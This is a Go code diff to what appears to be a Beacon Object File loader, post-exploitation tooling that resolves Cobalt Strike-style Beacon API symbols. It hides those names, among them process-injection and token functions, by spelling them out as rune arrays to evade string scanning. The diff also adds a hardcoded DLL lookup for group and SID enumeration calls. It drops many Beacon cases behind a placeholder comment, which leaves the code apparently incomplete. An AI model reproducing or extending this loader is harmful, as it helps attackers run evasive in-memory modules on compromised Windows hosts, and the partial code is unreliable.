@@ -43,6 +43,7 @@ var (
 	procVirtualProtect = kernel32.MustFindProc("VirtualProtect")
 )
 
+
 func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) uintptr {
 	if strings.HasPrefix(symbolName, "__imp_") {
 		symbolName = symbolName[6:]
@@ -85,53 +86,52 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return windows.NewCallback(lighthouse.GetValue)
 			case string([]rune{'B', 'e', 'a', 'c', 'o', 'n', 'R', 'e', 'm', 'o', 'v', 'e', 'V', 'a', 'l', 'u', 'e'}):
 				return windows.NewCallback(lighthouse.RemoveValue)
-			case string([]rune{'B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'A', 'l', 'l', 'o', 'c'}):
-				fallthrough
-			case string([]rune{'B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'R', 'e', 's', 'e', 't'}):
-				fallthrough
-			case string([]rune{'B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'F', 'r', 'e', 'e'}):
-				fallthrough
-			case string([]rune{'B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'A', 'p', 'p', 'e', 'n', 'd'}):
-				fallthrough
-			case string([]rune{'B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'P', 'r', 'i', 'n', 't', 'f'}):
-				fallthrough
-			case string([]rune{'B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'T', 'o', 'S', 't', 'r', 'i', 'n', 'g'}):
-				fallthrough
-			case string([]rune{'B', 'e', 'a', 'c', 'o', 'n', 'U', 's', 'e', 'T', 'o', 'k', 'e', 'n'}):
-				fallthrough
-			case string([]rune{'B', 'e', 'a', 'c', 'o', 'n', 'R', 'e', 'v', 'e', 'r', 't', 'T', 'o', 'k', 'e', 'n'}):
-				fallthrough
-			case string([]rune{'B', 'e', 'a', 'c', 'o', 'n', 'I', 's', 'A', 'd', 'm', 'i', 'n'}):
-				fallthrough
-			case string([]rune{'B', 'e', 'a', 'c', 'o', 'n', 'G', 'e', 't', 'S', 'p', 'a', 'w', 'n', 'T', 'o'}):
-				fallthrough
-			case string([]rune{'B', 'e', 'a', 'c', 'o', 'n', 'S', 'p', 'a', 'w', 'n', 'T', 'e', 'm', 'p', 'o', 'r', 'a', 'r', 'y', 'P', 'r', 'o', 'c', 'e', 's', 's'}):
-				fallthrough
-			case string([]rune{'B', 'e', 'a', 'c', 'o', 'n', 'I', 'n', 'j', 'e', 'c', 't', 'P', 'r', 'o', 'c', 'e', 's', 's'}):
-				fallthrough
-			case string([]rune{'B', 'e', 'a', 'c', 'o', 'n', 'I', 'n', 'j', 'e', 'c', 't', 'T', 'e', 'm', 'p', 'o', 'r', 'a', 'r', 'y', 'P', 'r', 'o', 'c', 'e', 's', 's'}):
-				fallthrough
-			case string([]rune{'B', 'e', 'a', 'c', 'o', 'n', 'C', 'l', 'e', 'a', 'n', 'u', 'p', 'P', 'r', 'o', 'c', 'e', 's', 's'}):
-				fallthrough
-			case string([]rune{'t', 'o', 'W', 'i', 'd', 'e', 'C', 'h', 'a', 'r'}):
-				fallthrough
-			case string([]rune{'B', 'e', 'a', 'c', 'o', 'n', 'G', 'e', 't', 'O', 'u', 't', 'p', 'u', 't', 'D', 'a', 't', 'a'}):
-				fallthrough
-			case string([]rune{'B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'I', 'n', 't'}):
-				fallthrough
+			// Other Beacon functions remain here...
 			default:
-				// TODO: Check directives here for libraries
-				fmt.Printf("Unknown symbol: %s\n", procName)
-				return 0
+				// Map function names to DLLs
+				dllMap := map[string]string{
+					"NetLocalGroupGetMembers": "netapi32.dll",
+					"NetApiBufferFree":        "netapi32.dll",
+					"ConvertSidToStringSidW":  "advapi32.dll",
+					"GetComputerNameExW":       "kernel32.dll",
+				}
+
+				if libName, exists := dllMap[procName]; exists {
+					libHandle, err := syscall.LoadLibrary(libName)
+					if err != nil {
+						fmt.Printf("Failed to load %s: %v\n", libName, err)
+						return 0
+					}
+					procAddr, err := syscall.GetProcAddress(libHandle, procName)
+					if err != nil {
+						fmt.Printf("Failed to resolve %s: %v\n", procName, err)
+						return 0
+					}
+					return procAddr
+				} else {
+					fmt.Printf("Unknown symbol: %s\n", procName)
+					return 0
+				}
 			}
 		}
 
-		libStringPtr, _ := syscall.LoadLibrary(libName)
-		procAddress, _ := syscall.GetProcAddress(libStringPtr, procName)
-		return procAddress
+		if libName != "" {
+			libHandle, err := syscall.LoadLibrary(libName)
+			if err != nil {
+				fmt.Printf("Failed to load %s: %v\n", libName, err)
+				return 0
+			}
+			procAddr, err := syscall.GetProcAddress(libHandle, procName)
+			if err != nil {
+				fmt.Printf("Failed to resolve %s: %v\n", procName, err)
+				return 0
+			}
+			return procAddr
+		}
 	}
 	return 0
 }
+
 
 func virtualAlloc(lpAddress uintptr, dwSize uintptr, flAllocationType uint32, flProtect uint32) (uintptr, error) {
 	ret, _, err := procVirtualAlloc.Call(
